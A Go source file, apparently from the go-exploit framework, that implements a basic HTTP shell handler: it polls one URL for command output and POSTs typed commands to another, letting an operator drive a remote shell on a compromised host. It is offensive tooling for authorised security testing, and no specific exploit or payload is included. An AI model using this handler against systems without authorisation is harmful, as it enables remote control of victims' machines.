package httpdemo

import (
	"bufio"
	"os"
	"sync"
	"time"

	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/protocol"
)

// A very basic reverse/bind shell handler.
func Basic(readURL, writeURL string) {
	// Create channels for communication between goroutines.
	responseCh := make(chan string)
	quit := make(chan struct{})

	// Use a WaitGroup to wait for goroutines to finish.
	var wg sync.WaitGroup

	// Goroutine to read responses from the server.
	wg.Add(1)
	go func() {
		defer wg.Done()
		// responseBuffer := make([]byte, 1024)
		for {
			select {
			case <-quit:
				return
			default:
				_, body, ok := protocol.HTTPSendAndRecv("GET", readURL, "")
				if !ok {
					return
				}
				responseCh <- body
				time.Sleep(3 * time.Second)
			}
		}
	}()

	// Goroutine to handle responses and print them.
	wg.Add(1)
	go func() {
		defer wg.Done()
		for response := range responseCh {
			select {
			case <-quit:
				return
			default:
				output.PrintShell(response)
			}
		}
	}()

	for {
		reader := bufio.NewReader(os.Stdin)
		command, _ := reader.ReadString('\n')
		if command == "exit\n" {
			return
		}
		headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
		_, body, ok := protocol.HTTPSendAndRecvWithHeaders("POST", writeURL, "d="+command, headers)
		if !ok || command == "exit\n" || len(body) > 0 {
			break
		}
	}

	// signal for everyone to shutdown
	quit <- struct{}{}
	close(responseCh)

	// wait until the go routines are clean up
	wg.Wait()
}
